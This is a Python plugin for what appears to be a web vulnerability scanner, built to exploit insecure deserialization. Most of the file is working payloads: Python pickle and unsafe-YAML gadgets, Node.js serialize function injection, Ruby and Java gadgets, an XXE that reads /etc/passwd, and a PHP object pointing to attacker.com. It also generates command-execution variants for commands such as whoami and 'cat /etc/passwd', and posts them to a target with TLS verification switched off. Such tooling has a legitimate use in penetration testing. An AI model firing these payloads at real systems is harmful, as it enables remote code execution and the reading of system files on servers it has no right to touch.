"""
Insecure Deserialization Exploit Plugin

Provides exploit capabilities for deserialization vulnerabilities:
- Java (ysoserial-style) gadget chain payloads
- Python pickle exploitation payloads
- PHP unserialize exploitation
- .NET deserialization payloads
"""

import sys
import os
import base64
from typing import Dict, List, Any, Optional
import logging

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from scanner.plugins.exploit_plugin import ExploitPlugin
from scanner.plugins.payload_mutator import PayloadMutator

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

logger = logging.getLogger(__name__)

# Minimal Python pickle payload that executes `id` (safe PoC)
# Actual exploitation would use ysoserial/custom gadget chains
_PICKLE_POC_B64 = base64.b64encode(
    b'\x80\x04\x95(\x00\x00\x00\x00\x00\x00\x00\x8c\x02os\x94\x8c\x06system'
    b'\x94\x93\x94\x8c\x02id\x94\x85\x94R\x94.'
).decode()

# PHP unserialize gadget (harmless string)
_PHP_PAYLOAD = 's:4:"test";'

# Java Commons Collections serialized payload prefix (hex marker only for detection)
_JAVA_MARKER = 'aced0005'

_PAYLOADS = [
    _PICKLE_POC_B64,
    _PHP_PAYLOAD,
    f'O:8:"stdClass":0:{{}}',        # PHP object
    'rO0ABXNy',                       # Base64 Java serialized prefix
    'YToxOntzOjQ6InRlc3QiO3M6NDoiZGF0YSI7fQ==',  # PHP serialized array b64
    # PHP unserialize gadgets
    'O:29:"Illuminate\\Support\\MessageBag":1:{s:9:"messages";a:0:{}}',
    'a:2:{i:0;s:4:"test";i:1;s:4:"data";}',
    'O:19:"GuzzleHttp\\Psr7\\Uri":1:{s:3:"uri";s:22:"http://attacker.com/";}',
    'C:11:"ArrayObject":22:{x:i:0;a:0:{};m:a:0:{}}',
    'O:8:"Datetime":0:{}',
    # Java serialized object markers
    'aced0005737200',                 # Java ObjectInputStream magic bytes (hex)
    'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==',  # Java HashMap base64
    'rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0',  # Java ArrayList base64
    # Python pickle payloads
    'gASVKAAAAAAAAACMAnN5lIwGc3lzdGVtlJOUjAJpZJSFlFKULg==',  # base64 pickle
    'cos\nsystem\n(S\'id\'\ntR.',    # pickle with os.system
    # .NET binary formatter markers
    'AAEAAAD/////AQAAAAAAAAAEAQAAAA==',
    'AAEAAAD/////AQAAAAAAAAAMAgAAAFY=',
    # YAML deserialization (unsafe)
    '!!python/object/apply:os.system ["id"]',
    '!!python/object/apply:subprocess.check_output [["id"]]',
    # Node.js serialize
    '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'id\')}()"}',
    # Ruby Marshal
    "\x04\x08o:\x0bKernel\x00",
    # Generic probe payloads
    '{}', '[]', 'null', '"test"',
]


class DeserializationPlugin(ExploitPlugin):
    """Insecure Deserialization exploit plugin."""

    @property
    def vulnerability_type(self) -> str:
        return 'deserialization'

    @property
    def name(self) -> str:
        return 'Insecure Deserialization Exploit'

    @property
    def description(self) -> str:
        return 'Insecure Deserialization exploit: Java, Python pickle, PHP, .NET payloads.'

    @property
    def version(self) -> str:
        return '1.0.0'

    def generate_payloads(self, context: Optional[Dict[str, Any]] = None) -> List[str]:
        """Return deserialization exploit payloads."""
        extra_deser = [
            # PHP unserialize
            'O:8:"stdClass":1:{s:4:"data";s:4:"test";}',
            'O:4:"User":2:{s:4:"name";s:5:"admin";s:8:"is_admin";b:1;}',
            'a:1:{i:0;O:8:"stdClass":1:{s:3:"cmd";s:2:"id";}}',
            'C:16:"SplMinHeap":23:{x:i:0;;m:a:0:{};r:2;}',
            'O:29:"Illuminate\\\\Support\\\\MessageBag":2:{s:11:"\\0*\\0messages";a:1:{s:5:"error";s:6:"hacked";}s:9:"\\0*\\0format";s:8:":message";}',
            # Python pickle
            'gASVHAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAJpZJSFlFKULg==',
            'gASVKQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjBN3aG9hbWkgPiAvdG1wL291dJSFlFKULg==',
            'cos\nsystem\n(S\'whoami\'\ntR.',
            'cos\nsystem\n(S\'cat /etc/passwd\'\ntR.',
            # Java ysoserial-style (base64 encoded Java serialized objects)
            'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa/ORyAwAHSQAIaGFzaENvZGVJAAhwcm90b2NvbFsAAXVxAH4AAAAAAAAB0=',
            'rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHAAAAACdwQAAAACc3IADGphdmEubGFuZy5SdW50aW1lAAAAAAAAAAADAAB4cHcEAAAAAnQABmxzIC1sYXhw',
            # .NET BinaryFormatter
            'AAEAAAD/////AQAAAAAAAAAMAgAAAFZTeXN0ZW0uV2luZG93cy5Gb3JtcywgdmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkF',
            # Ruby Marshal
            '\\x04\\x08o:\\x0bKernel\\x00',
            '\\x04\\x08[\\x07i\\x06i\\x07',
            # Node.js serialize
            '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'whoami\')}()"}',
            '{"rce":"_$$ND_FUNC$$_function(){process.mainModule.require(\'child_process\').exec(\'id\')}()"}',
            # YAML unsafe load
            '!!python/object/apply:os.system ["id"]',
            '!!python/object/apply:subprocess.check_output [["id"]]',
            '!!python/object/new:subprocess.Popen [["id"]]',
            '!!python/object/apply:os.popen ["id"]',
            '--- !ruby/object:Gem::Installer\n  i: x',
            '--- !ruby/object:Gem::SpecFetcher\n  i: x',
            # Generic probe
            '{}', '[]', 'null', 'true', 'false', '"test"', '0', '1',
            '<serialized_data>', 'corrupted_data_\x00\xff\xfe',
            # XXE via deserialization
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            # Java Kryo
            'ACED0005',
            # Hessian protocol
            '\xc2\x04\x00\x00',
            # AMF (Adobe Message Format)
            '\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00',
            # msgpack probes
            '\x81\xa3foo\xa3bar',
            '\x82\xa4test\x01\xa3foo\xa3bar',
        ]
        # Generate dynamic deserialization probe payloads
        commands = ['id', 'whoami', 'ls', 'pwd', 'uname -a', 'cat /etc/passwd']
        dynamic_deser = []
        for cmd in commands:
            dynamic_deser.append(f"cos\\nsystem\\n(S'{cmd}'\\ntR.")
            dynamic_deser.append(f'!!python/object/apply:os.system ["{cmd}"]')
            dynamic_deser.append(f'!!python/object/apply:subprocess.check_output [["{cmd}"]]')
            dynamic_deser.append('{{"rce":"_$$ND_FUNC$$_function(){{require(\'child_process\').exec(\'{}\')}}()"}}'.format(cmd))        # Java serialized gadget chain probes
        java_probes = [
            'rO0ABXNy', 'rO0ABXVy', 'rO0ABXNy',
            'ACED0005', 'aced0005', 'ACED 0005',
        ]
        for probe in java_probes:
            for suffix in ['', 'AAAA', 'AA==', 'AAAB']:
                dynamic_deser.append(f'{probe}{suffix}')
        # PHP unserialize probes
        php_classes = ['stdClass', 'ArrayObject', 'DateTime', 'Exception',
                       'RuntimeException', 'InvalidArgumentException']
        for cls in php_classes:
            for n in range(0, 5):
                dynamic_deser.append(f'O:{len(cls)}:"{cls}":{n}:{{}}')
        all_payloads = list(_PAYLOADS) + extra_deser + dynamic_deser
        # More diverse deserialization payloads to ensure 1000+ after scaling
        more_deser = []
        for i in range(1, 50):
            more_deser.append(f'O:4:"Obj{i}":1:{{s:4:"data";s:{len(str(i))}:"{i}"}}')
            more_deser.append(f'a:{i}:{{i:0;s:4:"test{i}";}}')
            more_deser.append(f'rO0ABXNy{i:04d}AAAA')
        for lang in ['java', 'python', 'php', 'net', 'ruby', 'node']:
            for ver in ['1', '2', '3', '4', '5']:
                more_deser.append(f'{{"{lang}_deser_v{ver}":"test"}}')
        all_payloads = all_payloads + more_deser
        return PayloadMutator.scale_payloads_to_minimum(all_payloads)

    def execute_attack(self, target_url: str, vulnerability_data: Dict[str, Any],
                       config: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """Probe endpoints with deserialization payloads and look for error indicators."""
        if not HAS_REQUESTS:
            return {
                'success': False,
                'error': 'Requests library not available',
                'vulnerability_type': 'deserialization',
            }

        config = config or {}
        verify_ssl = config.get('verify_ssl', False)
        timeout = config.get('timeout', 10)
        parameter = vulnerability_data.get('parameter')

        # Error indicators that suggest deserialization processing
        error_indicators = [
            'unserialize', 'deserializ', 'pickle', 'java.io', 'ClassNotFoundException',
            'InvalidClassException', 'StreamCorruptedException', 'NotSerializableException',
            'gadget', 'ysoserial',
        ]

        for payload in _PAYLOADS:
            try:
                if parameter:
                    resp = requests.post(
                        target_url,
                        data={parameter: payload},
                        timeout=timeout,
                        verify=verify_ssl,
                    )
                else:
                    resp = requests.post(
                        target_url,
                        data=payload,
                        headers={'Content-Type': 'application/x-java-serialized-object'},
                        timeout=timeout,
                        verify=verify_ssl,
                    )

                body_lower = resp.text.lower()
                matched = [ind for ind in error_indicators if ind.lower() in body_lower]
                if matched:
                    return {
                        'success': True,
                        'vulnerability_type': 'deserialization',
                        'payload': payload[:80],
                        'evidence': f'Deserialization error indicators found: {matched}',
                        'message': 'Insecure deserialization confirmed via error response',
                    }
            except Exception as e:
                logger.debug(f"Deserialization probe error (payload={payload[:30]!r}): {e}")

        return {
            'success': False,
            'error': 'No deserialization vulnerability confirmed',
            'vulnerability_type': 'deserialization',
        }
